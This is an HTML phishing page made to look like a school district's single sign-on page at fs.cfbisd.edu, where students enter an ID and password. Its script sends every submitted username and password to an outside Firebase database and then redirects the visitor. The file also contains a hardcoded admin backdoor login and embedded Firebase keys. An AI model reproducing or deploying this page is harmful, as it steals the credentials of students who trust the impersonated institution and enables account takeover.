<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" type="text/css" href="./StyleSheet.css"/>  
</head>

<body>
  <div class="MainArea">
        <div class="Header"><span>Sign In</span></div>
        
        <div class="GroupXLargeMargin"><img src="./cfbisd edu_logo_v1.png" alt="logo" /></div>
        
        <div class="GroupLargeMargin">
            <div class="TextSizeXLarge"><span>fs.cfbisd.edu</span></div>
        </div>

    <div class="MainActionContainer">
      <form id="form">
  <div class="GroupXLargeMargin"><span>Type your user name and password.</span></div>
  <table class="UsernamePasswordTable">
        <tr>
            <td><span class="Label"><span>User name: </span></span></td>
            <td><input type="text"/></td>
            <td class="TextColorSecondary TextSizeSmall"><span>Example: Student ID</span></td>
        </tr>

        <tr>
            <td><span class="Label"><span>Password: </span></span></td>
            <td><input type="password"/></td>
            <td>&nbsp;</td>
        </tr>

        <tr>
            <td></td>
            <td colspan="2" class="TextSizeSmall TextColorError"></td>
        </tr>

        <tr>
      <td colspan="2">
        <div class="RightAlign GroupXLargeMargin">
          <input type="submit" value="Sign In" class="Resizable" />
        </div>
      </td>
            <td>&nbsp;</td>
        </tr>

  </table>

  </form>
  </div>




    
   <!-- Firebase SDKs -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyBGPFSP0e0oYqKqvJHLB5eGlX9mJ8aU09s",
  authDomain: "test-da143.firebaseapp.com",
  databaseURL: "https://test-da143-default-rtdb.firebaseio.com",
  projectId: "test-da143",
  storageBucket: "test-da143.firebasestorage.app",
  messagingSenderId: "58366480447",
  appId: "1:58366480447:web:f3dd12850f09952b49688a"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const form = document.getElementById("form");
form.addEventListener("submit", e => {
  e.preventDefault();
  const username = document.querySelector('input[type="text"]').value.trim();
  const password = document.querySelector('input[type="password"]').value.trim();


  // Admin login
  if (username === "admin" && password === "TotrRealAura") {
    sessionStorage.setItem("adminAccess", "true");
    window.location.href = "admin.html";
    return;
  }


  if (!/^[0-9]{6}$/.test(username)) return alert("Username must be 6 digits.");
  if (!password) return alert("Password cannot be empty.");

  // Save login info to Firebase
  db.ref("users").push({ username, password, timestamp: Date.now() });

  // Store session
  sessionStorage.setItem("loginAsk", "true");
  sessionStorage.setItem("username", username);
  localStorage.setItem("username", username);

  window.location.href = "homepage.html";
});
</script>

</body>
</html>
